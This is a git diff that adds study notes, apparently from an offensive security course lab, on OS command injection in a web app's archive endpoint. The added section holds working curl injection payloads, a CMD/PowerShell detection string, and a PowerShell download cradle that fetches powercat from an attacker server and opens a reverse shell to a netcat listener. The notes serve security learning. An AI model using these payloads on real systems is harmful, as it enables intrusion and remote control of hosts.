@@ -215,13 +215,61 @@ rm ~/.ssh/known_hosts
 3) connect with SSA Key
 ssh -p 2222 -i fileup root@mountaindesserts.com
 
+### 9.4.1. OS Command Injection
+
+This never occured to me, but when a file is uploaded to a web app via file upload, it us using the underlying operating system.
+
+The correct way to implement this is to create prepared commands which cannot be changed by user input. This takes a lot of time
+
+Try different commands in case there is a filter. Does the web app give a hint as to what command is being used? In this case it was heavily hinted to use git.
+
+curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
+-X: change request to POST type
+
+curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+this is git;ipconfig which executes both commands seperately
+
+Find if command is executed by CMD or Powershell
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+
+find if command is executed by cmd or powershell, encoded
+curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
+
+Target is powershell, use Powercat (Powershell ncat) to get shell
+
+Move payload to attacker http server
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 80
+
+nc -nvlp 4444
+
+powershell cradle to get powercat from server
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+IEX.... : This part is to download powercat from attackbox
+powercat -c: this is to actually run power cat
+
+encoded request
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACK-HTTP-SERVER>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER>%20-p%204444%20-e%20powershell' http://TARGET:PORT/archive
+
+When encoding payloads it looks like they encoded special characters, spaces... really everything except for the words and ('s )'s
+
+
+
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 Extra Reading   
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
-### 9.3.2 Using Non-Executable Files
+9.4.1. OS Command Injection
+https://github.com/offensive-security/exploitdb
+https://git-scm.com/docs/git
+https://gitforwindows.org/
+https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmd
+https://stackoverflow.com/users/4003407/user4003407
+https://github.com/besimorhino/powercat
+
+9.3.2 Using Non-Executable Files
 https://en.wikipedia.org/wiki/Google_Drive
 https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities
 https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools
